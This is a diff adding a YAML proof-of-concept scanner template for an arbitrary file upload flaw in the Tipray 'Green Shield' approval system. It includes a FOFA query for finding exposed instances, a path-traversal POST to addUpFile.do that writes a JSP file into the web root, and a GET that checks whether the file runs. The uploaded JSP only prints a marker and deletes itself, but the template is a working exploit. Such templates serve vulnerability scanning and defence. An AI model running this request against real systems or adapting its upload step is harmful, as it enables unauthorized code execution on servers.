@@ -1,0 +1,43 @@
+id: poc-yaml-tipray-gsas-addupfile-do-anyfile-upload
+info:
+  name: 天锐绿盾审批系统 addUpFile.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /trwfe/service/.%2E/file/addUpFile.do
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ89XK7WxiQuU7uq1
+  data: '------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="relativepath"
+
+
+    ../../webapps/ROOT/c
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="taskId"
+
+
+    123456
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1--'
+  expression: status_code == 200 && contains(body,"true")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
